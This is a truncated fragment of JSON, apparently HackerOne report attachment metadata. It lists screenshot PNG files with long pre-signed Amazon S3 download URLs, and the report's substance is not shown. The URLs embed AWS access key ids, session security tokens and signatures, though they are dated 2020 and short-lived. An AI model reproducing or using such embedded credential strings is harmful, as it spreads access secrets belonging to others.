pzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=708f7aa76754f7b9d4f8a0df16871c000e0845e31848b16fea4fbb0c73ea920a","file_size":11859,"type":"image/png"},{"id":434454,"file_name":"Selection_204.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/454/015bcbe7434144afe559a369b19f063a31bce110/Selection_204.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_204.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_204.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=a5cff27030729adb50aec50273b7921eb3ea628f6b1e153202f1743f1a9337c6","file_size":11758,"type":"image/png"},{"id":434469,"file_name":"Selection_205.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/469/8eefa704667c57410e834ebc5afaa1f6699f0ea4/Selection_205.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_205.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_205.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=469f612dee294769c6a5062c882384c06ede27d2f53fdc251a40b077b890514d","file_size":14939,"type":"image/png"},{"id":434477,"file_name":"Selection_207.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/477/fcb1e9a94b1ec6a38cf179bacab8575faac84a33/Selection_207.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_207.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_207.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=a056dad6f69bd3b5fc30afeb535f4d7fd9349f5df7f80ad4c3af95c0fdf7ecd2","file_size":17592,"type":"image/png"},{"id":434479,"file_name":"Selection_208.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/479/83b20fc2726b84d6349ed2bfacc59f86f4815032/Selection_208.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_208.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_208.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=6cb74c1180aa3d74985e0f91fbd1ec485bcc728ef9c3daf51046be6a76b480fd","file_size":16182,"type":"image/png"},{"id":434483,"file_name":"Selection_209.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/483/2ce1095372eed8396d2505972b765c82f4f51b21/Selection_209.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_209.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_209.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=7627c1470f23c56dd5413170cfde73358c697260ac5e7603743c8729324b1696","file_size":20502,"type":"image/png"},{"id":434515,"file_name":"Selection_210.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/515/a0af415e6ef0c5377aec97d2ea3ed3447930fce0/Selection_210.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_210.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_210.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=65ad3a43694ea8203bbeeaea406c76b09a610f1cdd1cd20f10a2ebe65c73ba4f","file_size":12261,"type":"image/png"},{"id":434519,"file_name":"Selection_211.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/519/27aea19812407d5d9ca7e666c67b5d4068159834/Selection_211.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_211.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_211.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=9e4a1aeea6f9bc5b91d06910ff8830843654794ae8fd342d060fc1db2cbe2a8d","file_size":17626,"type":"image/png"},{"id":434520,"file_name":"Selection_212.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/520/7449ad9f3ac7bc545926b58444112feef9201b99/Selection_212.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_212.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_212.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=45ae2ee9aced64efd57be3c51928d83bcb00e5f0e26ed32f16b7c458010000a9","file_size":31759,"type":"image/png"},{"id":434521,"file_name":"Selection_213.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/521/c94c9cc88f044eee89695e5ae8ec7bf668f3e882/Selection_213.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_213.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_213.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026X-Amz-Signature=e9001cfd2cea427151498893c744ca1b2be068afc4e335a1d1200bf509b2a0b8","file_size":88025,"type":"image/png"},{"id":434522,"file_name":"Selection_214.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/522/d87f293e13f10d1126c0e792c561f2571ea123e4/Selection_214.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_214.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_214.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061021Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzs